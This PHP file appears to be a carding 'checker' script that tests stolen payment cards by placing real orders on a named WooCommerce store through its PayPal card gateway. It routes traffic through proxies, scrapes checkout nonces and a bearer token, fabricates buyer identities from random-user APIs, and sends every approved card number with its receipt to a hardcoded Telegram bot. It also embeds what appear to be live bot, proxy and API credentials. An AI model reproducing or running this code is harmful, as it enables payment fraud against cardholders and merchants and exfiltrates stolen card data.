<?php

error_reporting(E_ERROR|E_PARSE);
ini_set("max_execution_time", "0");

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    extract($_POST);
} elseif ($_SERVER["REQUEST_METHOD"] == "GET") {
    extract($_GET);
}

list($cc, $mm, $yy, $cvv) = explode("|", $card);
list($cc1, $cc2, $cc3, $cc4) = str_split($cc, 4);
list($email, $passwords) = explode(":", $emails);
$mm1 = ltrim($mm, "0"); $mm === "10" ? $mm1 = "10" : $mm;
$yy1 = str_replace("20", "", $yy);
$bin = substr($cc, 0, 6);

function extract_string($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}





$bot ='5422145271:AAHZVLpnDfL9ECvrlpRcSWYMX_HVi8uZkqY'; 
$chatid= '-1001806477531';


$ip = $_SERVER['REMOTE_ADDR'];
$userpass = "55hb3cjj1dm5ahj:gosc3579yjgg2ia";
$proxy = "rp.proxyscrape.com:6060";
$url = "https://ip.nf/me.json";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY,  $proxy);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $userpass);
$ip1 = curl_exec($ch);
curl_close($ch);
ob_flush();
$ip0 = extract_string($ip1, '"ip":"','"');
if (isset($ip1)){
$ip = '[🗸'.$ip0.']';
}
if (empty($ip1)){ 
    $ip = "[DEAD [PAGANDA NALANG] ]"; 
    }
function unlinkCookies() {
    array_map("unlink", glob(getcwd() . "/cookies/cookies*.txt"));
}
if (!is_dir(getcwd() . "/cookies")) {
    mkdir(getcwd() . "/cookies", 0755);
}

$cookies = getcwd() . "/cookies/cookies" . rand(1000000, 99999999) . ".txt";

if($card) {
    $key = "bf1e2760";
    $country = "united_states";

    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => "https://my.api.mockaroo.com/$country.json?key=$key",
        CURLOPT_USERAGENT => $_SERVER["HTTP_USER_AGENT"],
        CURLOPT_HTTPGET => true,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_COOKIEFILE => $cookies,
        CURLOPT_COOKIEJAR => $cookies,
         
    ]);


    $result99 = json_decode(file_get_contents("https://random-data-api.com/api/users/random_user"));
    // $fname = $result->first_name;
    // $lname = $result->last_name;
    $email = str_replace("email", "destinys.co", $result99->email);
    $curl1 = curl_exec($ch);

    // $first = json_decode($curl1)->first;
    // $last = json_decode($curl1)->last;
    // $email = json_decode($curl1)->email;
    // $phone = json_decode($curl1)->phone;
    // $street = json_decode($curl1)->street;
    // $zip = json_decode($curl1)->zip;
    // $city = json_decode($curl1)->city;
    // $state1 = json_decode($curl1)->state1;
    // $state2 = json_decode($curl1)->state2;

    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => "https://api.ipify.org/",
        CURLOPT_USERAGENT => $_SERVER["HTTP_USER_AGENT"],
        CURLOPT_HTTPGET => true,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_COOKIEFILE => $cookies,
        CURLOPT_COOKIEJAR => $cookies,
    ]);
    $curl2 = curl_exec($ch);


# { RANDOM INFORMATION }

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/1.2/?nat=us');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, Array( "Accept: application/json" ));
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$random_decode = json_decode($random_user = curl_exec($ch), true);
$title = $random_decode['results']['0']['name']['title'];
$fname = $random_decode['results']['0']['name']['first'];
$lname = $random_decode['results']['0']['name']['last'];
$street = $random_decode['results']['0']['location']['street'];
$city = $random_decode['results']['0']['location']['city'];
$state = $random_decode['results']['0']['location']['state'];
$postcode = $random_decode['results']['0']['location']['postcode'];
$phone = $random_decode['results']['0']['phone'];
curl_close($ch);





$maxRetries = '2';
while (empty($checkoutNonce) && $retryCount < $maxRetries) {
//     $ch = curl_init();
//     curl_setopt($ch, CURLOPT_PROXY, $proxy_port);
//     curl_setopt($ch, CURLOPT_PROXYUSERPWD, $loginpassw);
//         curl_setopt_array($ch, [
//         CURLOPT_URL => "https://www.cmleague.com/?wc-ajax=add_to_cart",
//         CURLOPT_USERAGENT => $_SERVER["HTTP_USER_AGENT"],
//         CURLOPT_POST => true,
//         CURLOPT_RETURNTRANSFER => true,
//         CURLOPT_COOKIEFILE => $cookies,
//         CURLOPT_COOKIEJAR => $cookies,
//         CURLOPT_HTTPHEADER => [
//             "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
//             "Referer: https://www.cmleague.com/product-category/books/",
//             "Content-Type: application/x-www-form-urlencoded; charset=UTF-8"
//         ],
//         CURLOPT_POSTFIELDS => http_build_query([
//           "product_id" => 112,
//           "quantity" => 1
//         ])
//     ]);
// $curl3 = curl_exec($ch);


$url_checkout = '';
$url = '';


$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $proxy_port);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $loginpassw);
    curl_setopt_array($ch, [
    CURLOPT_URL => "https://store.startingstrongman.com/?wc-ajax=add_to_cart",
    CURLOPT_USERAGENT => $_SERVER["HTTP_USER_AGENT"],
    CURLOPT_POST => true,
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_COOKIEFILE => $cookies,
    CURLOPT_COOKIEJAR => $cookies,
    CURLOPT_HTTPHEADER => [
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Referer: https://store.startingstrongman.com/shop/",
        "Content-Type: application/x-www-form-urlencoded; charset=UTF-8"
    ],
    CURLOPT_POSTFIELDS => http_build_query([
      "product_id" => 188,
      "quantity" => 1
    ])
]);
$curl3 = curl_exec($ch);

$ch = curl_init();
    curl_setopt($ch, CURLOPT_PROXY, $proxy_port);
    curl_setopt($ch, CURLOPT_PROXYUSERPWD, $loginpassw);
    curl_setopt_array($ch, [
        CURLOPT_URL => "https://store.startingstrongman.com/checkout/",
        CURLOPT_USERAGENT => $_SERVER["HTTP_USER_AGENT"],
        CURLOPT_HTTPGET => true,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_COOKIEFILE => $cookies,
        CURLOPT_COOKIEJAR => $cookies,
        //    CURLOPT_PROXY => $proxies,
        //     CURLOPT_PROXYPORT => $proxy_port,
        //  CURLOPT_PROXYUSERPWD => $proxy_userpass,
  
    ]);
    $curl4 = curl_exec($ch);

    $getNonce = json_decode(extract_string($curl4,'var PayPalCommerceGateway = ',';'));
    $orderNonce = $getNonce->ajax->create_order->nonce;
    $approveNonce = $getNonce->ajax->approve_order->nonce;
    $clientNonce = $getNonce->data_client_id->nonce;
    $checkoutNonce = extract_string($curl4, '<input type="hidden" id="woocommerce-process-checkout-nonce" name="woocommerce-process-checkout-nonce" value="','"');
    $retryCount++;
}





    $ch = curl_init();
    curl_setopt($ch, CURLOPT_PROXY, $proxy_port);
    curl_setopt($ch, CURLOPT_PROXYUSERPWD, $loginpassw);
        curl_setopt_array($ch, [
            CURLOPT_URL => "https://store.startingstrongman.com/?wc-ajax=ppc-data-client-id",
            CURLOPT_USERAGENT => $_SERVER["HTTP_USER_AGENT"],
            CURLOPT_POST => true,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_COOKIEFILE => $cookies,
            CURLOPT_COOKIEJAR => $cookies,
            CURLOPT_HTTPHEADER => [
                "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                "Referer:  https://store.startingstrongman.com/checkout/",
                "Content-Type: application/x-www-form-urlencoded; charset=UTF-8"
            ],
            CURLOPT_POSTFIELDS => json_encode([
                "nonce" => $clientNonce,
            ])
        ]);
        $curl5 = curl_exec($ch);
    
        $json = json_decode($curl5);
        $getBearer = $json->token;
        $base64Bearer = base64_decode($getBearer);
        $bearer = extract_string($base64Bearer,'"accessToken":"','"');






        $ch = curl_init();
        curl_setopt($ch, CURLOPT_PROXY, $proxy_port);
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $loginpassw);
        curl_setopt_array($ch, [
            CURLOPT_URL => "https://store.startingstrongman.com/?wc-ajax=ppc-create-order",
            CURLOPT_USERAGENT => $_SERVER["HTTP_USER_AGENT"],
            CURLOPT_POST => true,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_COOKIEFILE => $cookies,
            CURLOPT_COOKIEJAR => $cookies,
            //    CURLOPT_PROXY => $proxies,
            //     CURLOPT_PROXYPORT => $proxy_port,
            //  CURLOPT_PROXYUSERPWD => $proxy_userpass,
            CURLOPT_HTTPHEADER => [
                "Accept: */*",
                "Referer: https://store.startingstrongman.com/checkout/",
                "Content-Type: application/json"
            ],
            // CURLOPT_POSTFIELDS => 
                  CURLOPT_POSTFIELDS => json_encode([
                "nonce"=>  $orderNonce,
                "payer"=>  null,
                "bn_code" =>  "Woo_PPCP",
                "context" =>  "checkout",
                "createaccount" => false,
                "order_id" =>  "0",
                "payment_method" =>  "ppcp-credit-card-gateway",
                "save_payment_method" => false,
                "form_encoded" =>                "billing_email=sheesh%40huasd.com&billing_first_name=sawa&billing_last_name=yawa&billing_company=&billing_country=US&billing_address_1=3820+Industrial+Way&billing_address_2=&billing_city=Benicia&billing_state=AL&billing_postcode=94510&billing_phone=0191+497+5033&shipping_first_name=sawa&shipping_last_name=yawa&shipping_company=&shipping_country=US&shipping_address_1=3820+Industrial+Way&shipping_address_2=&shipping_city=Benicia&shipping_state=AL&shipping_postcode=94510&shipping_phone=0191+497+5033&order_comments=&wc_order_attribution_source_type=typein&wc_order_attribution_referrer=%28none%29&wc_order_attribution_utm_campaign=%28none%29&wc_order_attribution_utm_source=%28direct%29&wc_order_attribution_utm_medium=%28none%29&wc_order_attribution_utm_content=%28none%29&wc_order_attribution_utm_id=%28none%29&wc_order_attribution_utm_term=%28none%29&wc_order_attribution_session_entry=https%3A%2F%2Fstore.startingstrongman.com%2Fproduct-category%2Flifting-straps%2F&wc_order_attribution_session_start_time=2024-04-13+03%3A39%3A11&wc_order_attribution_session_pages=5&wc_order_attribution_session_count=1&wc_order_attribution_user_agent=Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F123.0.0.0+Safari%2F537.36&shipping_method%5B0%5D=flat_rate%3A1&payment_method=ppcp-credit-card-gateway&woocommerce-process-checkout-nonce=$checkoutNonce&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&ppcp-resume-order=pcp_customer_t_d2b47a554dc04f4ef9b06375f165f3&ppcp-resume-order=pcp_customer_t_d2b47a554dc04f4ef9b06375f165f3",



            ])
        ]);


        $curl6 = curl_exec($ch);

        $getID = json_decode($curl6);
        $tokenID = $getID->data->id;
        $customID = $getID->data->custom_id;
    
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_PROXY, $proxy_port);
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $loginpassw);
        curl_setopt_array($ch, [
            CURLOPT_URL => "https://cors.api.paypal.com/v2/checkout/orders/$tokenID/confirm-payment-source",
            CURLOPT_USERAGENT => $_SERVER["HTTP_USER_AGENT"],
            CURLOPT_POST => true,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_COOKIEFILE => $cookies,
            CURLOPT_COOKIEJAR => $cookies,
            CURLOPT_HTTPHEADER => [
                "Accept: */*",
                "Content-Type: application/json",
                "Authorization: Bearer $bearer",
                "Paypal-Client-Metadata-Id: " . bin2hex(random_bytes(16)) . "",
                "Braintree-Sdk-Version: 3.32.0-payments-sdk-dev",
                "Origin: https://assets.braintreegateway.com",
                "Referer: https://assets.braintreegateway.com/"
            ],
            CURLOPT_POSTFIELDS => json_encode([
                "payment_source" => [
                    "card" => [
    
                        "number" => $cc,
                        "expiry" => implode('-', [$yy, $mm]),
                         "security_code" => implode([$cvv]),
                         "name" => implode(' ', [$first, $last])
                    ]
                ],
                "application_context" => [
                    "vault" => false
                ]
            ])
        ]);
        $curl7 = curl_exec($ch);



        $ch = curl_init();
        curl_setopt($ch, CURLOPT_PROXY, $proxy_port);
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $loginpassw);
        curl_setopt_array($ch, [
            CURLOPT_URL => "https://store.startingstrongman.com/?wc-ajax=ppc-approve-order",
            CURLOPT_USERAGENT => $_SERVER["HTTP_USER_AGENT"],
            CURLOPT_POST => true,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_COOKIEFILE => $cookies,
            CURLOPT_COOKIEJAR => $cookies,
            CURLOPT_HTTPHEADER => [
                "Accept: */*",
                "Content-Type: application/json",
                "Referer:  https://store.startingstrongman.com/checkout/",
            ],
            CURLOPT_POSTFIELDS => json_encode([
                "nonce" => $approveNonce,
                "order_id" => $tokenID
            ])
        ]);
        $curl8 = curl_exec($ch);





    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => "https://store.startingstrongman.com/?wc-ajax=checkout",
        CURLOPT_USERAGENT => $_SERVER["HTTP_USER_AGENT"],
        CURLOPT_POST => true,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_COOKIEFILE => $cookies,
        CURLOPT_COOKIEJAR => $cookies,
           CURLOPT_PROXY => $proxies,
            CURLOPT_PROXYPORT => $proxy_port,
         CURLOPT_PROXYUSERPWD => $proxy_userpass,

        CURLOPT_HTTPHEADER => [
            "Accept: application/json, text/javascript, */*; q=0.01",
            "Content-Type: application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With: XMLHttpRequest",
            "Origin:    https://store.startingstrongman.com",
            "Referer:   https://store.startingstrongman.com/checkout/"
        ],
        CURLOPT_POSTFIELDS => http_build_query([

            "billing_email" => $email,
            "billing_first_name" => $fname,
            "billing_last_name" =>  $lname,
          "billing_country" => "US",
          "billing_address_1" => $street,
          "billing_city" => $city,
           "billing_state" => "AL",
           "billing_postcode" =>  $postcode,
           "billing_phone" =>  $phone,
           "shipping_first_name" =>  $fname,
           "shipping_last_name" =>  $lname,
           "shipping_country" => "US",
           "shipping_address_1" => $street,
           "shipping_city" => $city,
           "shipping_state" => $state,
           "shipping_postcode" =>  $postcode,
           "shipping_phone" => $phone,
           "wc_order_attribution_source_type" => "typein",
           "wc_order_attribution_referrer" =>  "(none)",
           "wc_order_attribution_utm_campaign" => "(none)",
           "wc_order_attribution_utm_source" => "(direct)",
           "wc_order_attribution_utm_medium" => "(none)",
           "wc_order_attribution_utm_content" => "(none)",
           "wc_order_attribution_utm_id" => "(none)",
           "wc_order_attribution_utm_term" => "(none)",
           "wc_order_attribution_session_entry" => "https://store.startingstrongman.com/product-category/lifting-straps/",
           "wc_order_attribution_session_pages"=> "5",
           "wc_order_attribution_session_count" =>  "1",
           "wc_order_attribution_user_agent" =>  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
           "shipping_method[0]" => "flat_rate:1",
           "payment_method" =>  "ppcp-credit-card-gateway",
           "woocommerce-process-checkout-nonce" =>  $checkoutNonce,
           "_wp_http_referer" => "/?wc-ajax=update_order_review",
           "ppcp-resume-order" =>  $customID,
           "ppcp-resume-order" =>  $customID,
        ])
    ]);
 $curl9 = curl_exec($ch);




 $default = htmlentities(json_encode($curl9));
 $response = strip_tags(json_decode($curl9)->messages);
 $receipt = json_decode($curl9)->redirect;
 $receipturl = str_replace('\\', '', $receipt);

 if (strpos($curl9, "order-received")) {
     echo "#LIVE <b> Order-received Success</b>  - <a href='$receipturl' target='_blank'>Receipt</a>  [R:$retryCount] - [RIKA] <br> </br>";
          file_get_contents("https://api.telegram.org/bot$bot/sendMessage?chat_id=$chatid&text=$card  | <a href='$receipturl' target='_blank'>Receipt</a>  $19.99 [SITE : yarlungrecords.com] | APPROVED:CVV" );
     unlinkCookies();
     exit;
 } elseif($response == TRUE) {
     echo "#DEAD <b> $response </b>   retry [$retryCount] <br> </br>";
     unlinkCookies();
     exit;
 } elseif($default == TRUE) {
     echo "#DEAD  <b> $default </b>  -> retry [$retryCount] <br> </br>";
     unlinkCookies();
     exit;
 }

}

?>